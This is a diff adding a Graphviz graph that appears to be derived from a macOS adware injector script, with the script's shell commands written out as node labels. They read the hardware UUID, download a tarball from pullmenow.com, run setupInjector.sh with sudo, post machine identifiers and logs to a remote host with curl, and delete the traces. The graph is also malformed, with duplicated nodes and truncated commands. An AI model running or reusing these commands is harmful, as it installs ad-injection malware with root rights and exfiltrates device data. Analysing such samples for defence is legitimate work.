@@ -1,0 +1,202 @@
+digraph {
+0 [label="updFile=/var/tmp/updText.txt "];
+0 -> 0
+2 [label="updFileError=/var/tmp/updTextError.txt "];
+2 -> 4 [label="N,;,"];
+4 [label="chmod 777 $updFile "];
+4 -> 6 [label="N,;,"];
+6 [label="chmod 777 $updFileError "];
+6 -> 8 [label=";,"];
+8 [label="echo $updFile "];
+8 -> 192 [label=";,"];
+192 [label="$updFile "];
+192 -> 192
+12 [label="echo $updFileError "];
+12 -> 12
+168 [label="$updFileError "];
+168 -> 168
+16 [label="br_mid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk \'/IOPlatformUUID/ { split($0 "];
+16 -> 16
+18 [label="ioreg -rd1 -c IOPlatformExpertDevice "];
+18 -> 20 [label="N,N,N,"];
+20 [label="awk /IOPlatformUUID/ { split($0 "];
+20 -> 22 [label="N,"];
+22 [label="midFile=$(find /System/Library/Frameworks -type f -name \"*.uuid.plist\" -print0 | xargs -0 ls -tl | sort -n | tail -1 | awk \'{print $9}\ "];
+22 -> 22
+24 [label="find /System/Library/Frameworks -type f -name *.uuid.plist -print0 "];
+24 -> 26 [label="N,N,N,"];
+26 [label="xargs -0 ls -tl "];
+26 -> 28 [label="N,"];
+28 [label="sort -n "];
+28 -> 98 [label="N,"];
+98 [label="tail -1 "];
+98 -> 32 [label="N,"];
+32 [label="awk {print $9} "];
+32 -> 34 [label="N,"];
+34 [label="[ -e $midFile ] "];
+34 -> 36 [label="SC,N,if,"];
+36 [label="mid=$(echo \"$midFile\" | python -c \'import sys "];
+36 -> 96 [label=";,then,"];
+96 [label="echo $midFile "];
+96 -> 40 [label="N,N,N,"];
+40 [label="python -c import sys "];
+40 -> 42 [label="N,"];
+42 [label="echo mid: $mid. $updFile "];
+42 -> 192 [label="\n,"];
+192 [label="$updFile "];
+192 -> 192
+46 [label="get_pd_client_data=http://93a555685cc7443a8e1034efa1f18924.com/v/cld?mid=$br_mid&ct=pd "];
+46 -> 48 [label="\n,fi,"];
+48 [label="data=$(curl -s \"$get_pd_client_data\") "];
+48 -> 50 [label="N,"];
+50 [label="curl -s $get_pd_client_data "];
+50 -> 52 [label="N,N,"];
+52 [label="dc=PP5ddfd484f2030d9c-0-NM-XX "];
+52 -> 52
+54 [label=", word=\"channel=$(echo $dc | tr -d '[[:space:]]' | tr -cd 0-9)\" "];
+54 -> 56 [label="N,"];
+56 [label="echo $dc "];
+56 -> 58 [label="N,N,N,"];
+58 [label="tr -d [[:space:]] "];
+58 -> 60 [label="N,"];
+60 [label="tr -cd 0-9 "];
+60 -> 62 [label="N,"];
+62 [label="pdChannel=${dc:2} "];
+62 -> 62
+64 [label="echo DC: $dc $updFile "];
+64 -> 192 [label="N,"];
+192 [label="$updFile "];
+192 -> 192
+68 [label="click_id=0 "];
+68 -> 68
+70 [label="echo CLICK_ID: $click_id $updFile "];
+70 -> 192 [label="N,"];
+192 [label="$updFile "];
+192 -> 192
+74 [label="click_stamp= "];
+74 -> 74
+76 [label="echo CLICK_STAMP: $click_stamp $updFile "];
+76 -> 192 [label="N,"];
+192 [label="$updFile "];
+192 -> 192
+80 [label="id=$dc--$click_id___$click_stamp___$br_mid "];
+80 -> 80
+82 [label="echo Full ID: $id $updFile "];
+82 -> 192 [label="N,"];
+192 [label="$updFile "];
+192 -> 192
+86 [label="domain=http://aae9598c815c1745bd9f387c226fc02427.com "];
+86 -> 86
+88 [label="pop_url=http://aae9598c815c1745bd9f387c226fc02427.com/pp/fd?re=1&uid=[MACHINE_ID]&u=[CONTEXT_URL] "];
+88 -> 90 [label="N,"];
+90 [label="pop_delay=1 "];
+90 -> 92 [label="N,"];
+92 [label="[ $midFile ] "];
+92 -> 94 [label="N,SC,N,if,"];
+94 [label="frm=$(echo $midFile | tail -1 | awk -F \"/\" \'{print $5}\' | awk -F \".\" \'{print $1}\ "];
+94 -> 96 [label=";,then,"];
+96 [label="echo $midFile "];
+96 -> 98 [label="N,N,N,"];
+98 [label="tail -1 "];
+98 -> 100 [label="N,"];
+100 [label="awk -F / {print $5} "];
+100 -> 102 [label="N,"];
+102 [label="awk -F . {print $1} "];
+102 -> 104 [label="N,"];
+104 [label="mid_proc=false "];
+104 -> 106 [label="fi,"];
+106 [label="[ $frm ] "];
+106 -> 108 [label="N,SC,N,if,"];
+108 [label="ps -ef "];
+108 -> 110 [label=";,then,SC,N,if,N,"];
+110 [label="grep -v grep "];
+110 -> 112 [label="N,"];
+112 [label="grep -q $frm "];
+112 -> 114 [label="N,"];
+114 [label="mid_proc=true "];
+114 -> 116 [label=";,then,"];
+116 [label="echo midFile: $midFile. $updFile "];
+116 -> 192 [label="N,fi,fi,"];
+192 [label="$updFile "];
+192 -> 192
+120 [label="echo frm: $frm $updFile "];
+120 -> 120
+192 [label="$updFile "];
+192 -> 192
+124 [label="echo mid_proc: $mid_proc $updFile "];
+124 -> 124
+192 [label="$updFile "];
+192 -> 192
+128 [label="tmpfile=/var/tmp/dit8.tgz "];
+128 -> 130 [label="N,(,),SC,{,"];
+130 [label="filePath=/var/tmp/Injector10052016 "];
+130 -> 132 [label="N,\n,"];
+132 [label="/usr/bin/curl -s -L -o $tmpfile http://pullmenow.com/pd_files/dit8.tgz "];
+132 -> 170 [label="N,\n,"];
+170 [label="sleep 10 "];
+170 -> 136 [label="\n,"];
+136 [label="tar -xzf $tmpfile -C /var/tmp/ "];
+136 -> 194 [label="\n,"];
+194 [label="sleep 5 "];
+194 -> 140 [label="\n,"];
+140 [label="cd $filePath "];
+140 -> 142 [label="\n,"];
+142 [label="sudo chmod 777 $filePath/setupInjector.sh "];
+142 -> 144 [label="\n,"];
+144 [label="echo sudo $filePath/setupInjector.sh A$pdChannel $click_id $domain $updFile "];
+144 -> 192 [label="\n,"];
+192 [label="$updFile "];
+192 -> 192
+148 [label="sudo $filePath/setupInjector.sh A$pdChannel $click_id $domain "];
+148 -> 186 [label="\n,"];
+186 [label="sleep 30 "];
+186 -> 152 [label="\n,"];
+152 [label="shouldPDInj=1 "];
+152 -> 154 [label="\n,},"];
+154 [label="echo $shouldPDInj "];
+154 -> 156 [label="N,"];
+156 [label="[ $shouldPDInj == 1 ] "];
+156 -> 158 [label="SC,N,if,"];
+158 [label="echo vs_inj_no_mid $updFile "];
+158 -> 192 [label=";,then,"];
+192 [label="$updFile "];
+192 -> 192
+162 [label="echo Installing pInj with logger $updFile "];
+162 -> 192 [label="\n,"];
+192 [label="$updFile "];
+192 -> 192
+166 [label="pInj $updFileError "];
+166 -> 168 [label="\n,"];
+168 [label="$updFileError "];
+168 -> 168
+170 [label="sleep 10 "];
+170 -> 172 [label=";,"];
+172 [label="echo $(</var/tmp/updTextError.txt) $updFile "];
+172 -> 176 [label="\n,"];
+176 [label="/var/tmp/updTextError.txt "];
+176 -> 176 [label="N,"];
+176 [label="/var/tmp/updTextError.txt "];
+176 -> 176
+192 [label="$updFile "];
+192 -> 192
+180 [label="echo vs_inj_mid: $mid $updFile "];
+180 -> 192 [label="\n,else,"];
+192 [label="$updFile "];
+192 -> 192
+184 [label="eventType=Update Script Output "];
+184 -> 186 [label="fi,"];
+186 [label="sleep 30 "];
+186 -> 188 [label="N,"];
+188 [label="curl --request POST http://93a555685cc7443a8e1034efa1f18924.com/v/pd-logger --data vs_mid=$mid --data br_mid=$br_mid --data-urlencode event_type=$eventType --data-urlencode event_data=$(<$updFile) "];
+188 -> 188
+192 [label="$updFile "];
+192 -> 192 [label="N,"];
+192 [label="$updFile "];
+192 -> 192
+194 [label="sleep 5 "];
+194 -> 194
+196 [label="rm -rf $updFile "];
+196 -> 196
+198 [label="rm -rf /var/tmp/updText2.txt "];
+198 -> 198
+}
